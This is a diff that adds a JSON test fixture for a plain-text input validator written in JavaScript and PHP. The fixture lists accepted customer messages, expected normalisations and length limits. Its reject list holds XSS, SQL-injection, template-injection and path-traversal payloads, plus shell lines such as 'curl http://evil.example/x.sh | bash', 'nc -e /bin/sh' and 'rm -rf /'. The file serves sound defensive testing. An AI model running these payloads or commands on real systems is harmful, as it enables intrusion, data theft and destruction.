@@ -1,0 +1,509 @@
+{
+ "_doc": "Contrato de shared/plain-text.mjs (JS: navegador y Worker) y backend-php/api/lib/PlainText.php (PHP). Las expectativas están escritas a mano: si una prueba falla, se arregla el código, no este archivo. Limitación conocida y aceptada: una fórmula como «a<b y c>d» (una etiqueta HTML de una letra con espacios y un > después) se rechaza.",
+ "accept": [
+  {
+   "name": "es_tecnico",
+   "text": "Necesito 3 transformadores toroidales de 500 VA, 230V/2x24V, y un variador 0-250V (10A). Gracias.",
+   "multiline": true
+  },
+  {
+   "name": "en_quote",
+   "text": "Hello, I need a quote for 10 pcs of the 300VA model. Is 230V/24V (50-60Hz) available? Thanks & regards.",
+   "multiline": true
+  },
+  {
+   "name": "fr_devis",
+   "text": "Bonjour, je souhaite un devis pour des transformateurs d'isolement 1000 VA. Merci d'avance.",
+   "multiline": true
+  },
+  {
+   "name": "de_angebot",
+   "text": "Guten Tag, wir benötigen einen Ringkerntransformator 230V/2x15V, 2x2A. Bitte um Angebot.",
+   "multiline": true
+  },
+  {
+   "name": "menor_y_mayor_en_formulas",
+   "text": "Si V<Vn y I>In ¿qué protección recomiendan? Un saludo",
+   "multiline": true
+  },
+  {
+   "name": "flechas_y_tolerancias",
+   "text": "Tensión de salida: 24 V ± 5 % (a plena carga) -> ¿se puede ajustar?",
+   "multiline": true
+  },
+  {
+   "name": "menor_que_precio",
+   "text": "Precio por unidad < 50 € para pedidos > 100 uds.",
+   "multiline": true
+  },
+  {
+   "name": "apostrofes_comillas_ampersand",
+   "text": "O'Brien & Sons S.L. — pedido 'urgente'; entrega en 48h",
+   "multiline": true
+  },
+  {
+   "name": "la_palabra_select",
+   "text": "Quisiera información sobre la gama SELECT de variadores y de dónde se compra",
+   "multiline": true
+  },
+  {
+   "name": "select_from_en_ingles",
+   "text": "Please select a model from your catalog and send the price list (update: 2026).",
+   "multiline": true
+  },
+  {
+   "name": "dos_enlaces",
+   "text": "Mi web es https://empresa.example y mi otro sitio www.otra.example",
+   "multiline": true
+  },
+  {
+   "name": "lista_en_varias_lineas",
+   "text": "- 10 uds. TT0030210\n- 5 uds. TT0050210\n\nGracias",
+   "multiline": true
+  },
+  {
+   "name": "telefono_y_referencia",
+   "text": "Necesito el esquema (PDF). Teléfono: +34 600 000 000. Ref: P-1234/A",
+   "multiline": true
+  },
+  {
+   "name": "emoji_y_acentos",
+   "text": "Muchas gracias 😀 — ¡Un saludo! Ñandú çà über",
+   "multiline": true
+  },
+  {
+   "name": "almohadilla_y_porcentaje",
+   "text": "Pedido #1234 — ref. TT0030210 (30 VA) x 3 al 100% de acuerdo",
+   "multiline": true
+  },
+  {
+   "name": "llaves_sueltas",
+   "text": "100% de acuerdo; avísame {cuando} esté listo",
+   "multiline": true
+  },
+  {
+   "name": "correo_en_el_texto",
+   "text": "Mi correo: nombre.apellido@empresa.es",
+   "multiline": true
+  },
+  {
+   "name": "palabra_data_normal",
+   "text": "Os envío los data: tensión 230 V y corriente 5 A",
+   "multiline": true
+  },
+  {
+   "name": "onda_con_igual",
+   "text": "La onda cuadrada = 50 Hz y la sinusoidal = 60 Hz",
+   "multiline": true
+  },
+  {
+   "name": "vacio",
+   "text": "",
+   "multiline": true
+  }
+ ],
+ "reject": [
+  {
+   "name": "script",
+   "text": "<script>alert(1)</script>",
+   "code": "plain_text"
+  },
+  {
+   "name": "negrita",
+   "text": "Hola <b>mundo</b>",
+   "code": "plain_text"
+  },
+  {
+   "name": "img_onerror",
+   "text": "<img src=x onerror=alert(1)>",
+   "code": "plain_text"
+  },
+  {
+   "name": "svg_onload",
+   "text": "<svg/onload=alert(1)>",
+   "code": "plain_text"
+  },
+  {
+   "name": "cierre",
+   "text": "texto </div> más",
+   "code": "plain_text"
+  },
+  {
+   "name": "comentario",
+   "text": "a <!-- comentario --> b",
+   "code": "plain_text"
+  },
+  {
+   "name": "php",
+   "text": "<?php system($_GET['c']); ?>",
+   "code": "plain_text"
+  },
+  {
+   "name": "asp",
+   "text": "<% Response.Write(\"x\") %>",
+   "code": "plain_text"
+  },
+  {
+   "name": "elemento_con_atributo",
+   "text": "<x-foo onclick=\"x\">",
+   "code": "plain_text"
+  },
+  {
+   "name": "script_sin_cerrar",
+   "text": "hola <script src=//evil.example/x.js",
+   "code": "plain_text"
+  },
+  {
+   "name": "entidad_html",
+   "text": "&lt;script&gt;alert(1)&lt;/script&gt;",
+   "code": "plain_text"
+  },
+  {
+   "name": "entidad_numerica",
+   "text": "&#60;script&#62;",
+   "code": "plain_text"
+  },
+  {
+   "name": "javascript",
+   "text": "javascript:alert(1)",
+   "code": "plain_text"
+  },
+  {
+   "name": "javascript_mixto",
+   "text": "JaVaScRiPt :alert(1)",
+   "code": "plain_text"
+  },
+  {
+   "name": "vbscript",
+   "text": "vbscript:msgbox(1)",
+   "code": "plain_text"
+  },
+  {
+   "name": "data_html",
+   "text": "data:text/html;base64,PHNjcmlwdD4=",
+   "code": "plain_text"
+  },
+  {
+   "name": "invisible_en_javascript",
+   "text": "java​script:alert(1)",
+   "code": "plain_text"
+  },
+  {
+   "name": "invisible_en_etiqueta",
+   "text": "<scr​ipt>x</scr​ipt>",
+   "code": "plain_text"
+  },
+  {
+   "name": "plantilla_doble_llave",
+   "text": "{{7*7}}",
+   "code": "plain_text"
+  },
+  {
+   "name": "jndi",
+   "text": "${jndi:ldap://x.example/a}",
+   "code": "plain_text"
+  },
+  {
+   "name": "plantilla_almohadilla",
+   "text": "#{7*7}",
+   "code": "plain_text"
+  },
+  {
+   "name": "plantilla_porcentaje",
+   "text": "{% import os %}",
+   "code": "plain_text"
+  },
+  {
+   "name": "sql_or_comillas",
+   "text": "' OR '1'='1",
+   "code": "plain_text"
+  },
+  {
+   "name": "sql_or_numeros",
+   "text": "1 or 1=1",
+   "code": "plain_text"
+  },
+  {
+   "name": "sql_union",
+   "text": "x' UNION SELECT username, password FROM users--",
+   "code": "plain_text"
+  },
+  {
+   "name": "sql_drop",
+   "text": "1; DROP TABLE users; --",
+   "code": "plain_text"
+  },
+  {
+   "name": "sql_delete",
+   "text": "'; DELETE FROM pedidos",
+   "code": "plain_text"
+  },
+  {
+   "name": "sql_sleep",
+   "text": "1 AND SLEEP(5)",
+   "code": "plain_text"
+  },
+  {
+   "name": "sql_letras",
+   "text": "' OR 'a'='a",
+   "code": "plain_text"
+  },
+  {
+   "name": "sql_information_schema",
+   "text": "select table_name from information_schema.tables",
+   "code": "plain_text"
+  },
+  {
+   "name": "shell_dolar_parentesis",
+   "text": "$(whoami)",
+   "code": "plain_text"
+  },
+  {
+   "name": "shell_comillas_inversas",
+   "text": "`id`",
+   "code": "plain_text"
+  },
+  {
+   "name": "shell_cat",
+   "text": "foo; cat /etc/passwd",
+   "code": "plain_text"
+  },
+  {
+   "name": "shell_curl_bash",
+   "text": "x && curl http://evil.example/x.sh | bash",
+   "code": "plain_text"
+  },
+  {
+   "name": "shell_nc",
+   "text": "a | nc -e /bin/sh 10.0.0.1 4444",
+   "code": "plain_text"
+  },
+  {
+   "name": "shell_rm",
+   "text": "ok; rm -rf /",
+   "code": "plain_text"
+  },
+  {
+   "name": "shell_wget",
+   "text": "ok || wget http://evil.example/x",
+   "code": "plain_text"
+  },
+  {
+   "name": "ruta_relativa",
+   "text": "../../../../etc/passwd",
+   "code": "plain_text"
+  },
+  {
+   "name": "ruta_windows_relativa",
+   "text": "..\\..\\windows\\win.ini",
+   "code": "plain_text"
+  },
+  {
+   "name": "ruta_windows_absoluta",
+   "text": "C:\\Windows\\System32",
+   "code": "plain_text"
+  },
+  {
+   "name": "alert",
+   "text": "alert(1)",
+   "code": "plain_text"
+  },
+  {
+   "name": "eval_atob",
+   "text": "eval(atob('YWxlcnQoMSk='))",
+   "code": "plain_text"
+  },
+  {
+   "name": "document_cookie",
+   "text": "document.cookie",
+   "code": "plain_text"
+  },
+  {
+   "name": "window_location",
+   "text": "window.location='http://evil.example'",
+   "code": "plain_text"
+  },
+  {
+   "name": "onerror_suelto",
+   "text": "onerror=alert(1)",
+   "code": "plain_text"
+  },
+  {
+   "name": "innerhtml",
+   "text": "x.innerHTML=y",
+   "code": "plain_text"
+  },
+  {
+   "name": "fromcharcode",
+   "text": "String.fromCharCode(88,83,83)",
+   "code": "plain_text"
+  },
+  {
+   "name": "get_php",
+   "text": "$_GET['x']",
+   "code": "plain_text"
+  },
+  {
+   "name": "base64_decode",
+   "text": "base64_decode($x)",
+   "code": "plain_text"
+  },
+  {
+   "name": "solo_simbolos",
+   "text": "{[<>]}{[<>]}{[<>]}{[<>]}",
+   "code": "plain_text"
+  },
+  {
+   "name": "asignaciones",
+   "text": "a=b;c=d;e=f;g=h;i=j;k=l",
+   "code": "plain_text"
+  },
+  {
+   "name": "tres_enlaces",
+   "text": "https://a.example https://b.example http://c.example",
+   "code": "too_many_links"
+  },
+  {
+   "name": "tres_enlaces_www",
+   "text": "mira www.a.example, www.b.example y www.c.example",
+   "code": "too_many_links"
+  },
+  {
+   "name": "no_es_texto_lista",
+   "text": [
+    "a"
+   ],
+   "code": "not_text"
+  },
+  {
+   "name": "no_es_texto_objeto",
+   "text": {
+    "a": 1
+   },
+   "code": "not_text"
+  },
+  {
+   "name": "no_es_texto_numero",
+   "text": 123,
+   "code": "not_text"
+  },
+  {
+   "name": "no_es_texto_booleano",
+   "text": true,
+   "code": "not_text"
+  }
+ ],
+ "normalize": [
+  {
+   "name": "espacios_y_tabuladores",
+   "text": "  hola   mundo \t y\tadiós  ",
+   "multiline": false,
+   "out": "hola mundo y adiós"
+  },
+  {
+   "name": "saltos_multilinea",
+   "text": "línea 1\r\nlínea 2\rlínea 3",
+   "multiline": true,
+   "out": "línea 1\nlínea 2\nlínea 3"
+  },
+  {
+   "name": "saltos_una_linea",
+   "text": "línea 1\r\nlínea 2\rlínea 3",
+   "multiline": false,
+   "out": "línea 1 línea 2 línea 3"
+  },
+  {
+   "name": "muchas_lineas_en_blanco",
+   "text": "a\n\n\n\nb",
+   "multiline": true,
+   "out": "a\n\nb"
+  },
+  {
+   "name": "controles_e_invisibles",
+   "text": "ab\u0000c\u0007d​e‮f﻿g­h",
+   "multiline": false,
+   "out": "abcdefgh"
+  },
+  {
+   "name": "espacio_duro_en_los_bordes",
+   "text": "  hola  ",
+   "multiline": false,
+   "out": "hola"
+  },
+  {
+   "name": "bordes_con_saltos",
+   "text": " \n texto \n ",
+   "multiline": true,
+   "out": "texto"
+  },
+  {
+   "name": "espacios_antes_y_despues_del_salto",
+   "text": "a  \n  b",
+   "multiline": true,
+   "out": "a\nb"
+  },
+  {
+   "name": "nada_que_limpiar",
+   "text": "Texto normal, con ñ y 😀.",
+   "multiline": false,
+   "out": "Texto normal, con ñ y 😀."
+  },
+  {
+   "name": "separadores_unicode_de_linea",
+   "text": "rojo fin ok",
+   "multiline": false,
+   "out": "rojofinok"
+  }
+ ],
+ "limits": [
+  {
+   "name": "justo_80",
+   "text": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
+   "max": 80,
+   "multiline": false,
+   "ok": true
+  },
+  {
+   "name": "pasa_81",
+   "text": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
+   "max": 80,
+   "multiline": false,
+   "ok": false
+  },
+  {
+   "name": "emojis_cuentan_uno",
+   "text": "😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀",
+   "max": 80,
+   "multiline": false,
+   "ok": true
+  },
+  {
+   "name": "emojis_81",
+   "text": "😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀",
+   "max": 80,
+   "multiline": false,
+   "ok": false
+  },
+  {
+   "name": "acentos_cuentan_uno",
+   "text": "éééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééé",
+   "max": 80,
+   "multiline": false,
+   "ok": true
+  },
+  {
+   "name": "mil_caracteres",
+   "text": "palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra palabra",
+   "max": 1000,
+   "multiline": true,
+   "ok": true
+  },
+  {
+   "name": "mil_y_uno",
+   "text": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
+   "max": 1000,
+   "multiline": true,
+   "ok": false
+  }
+ ]
+}
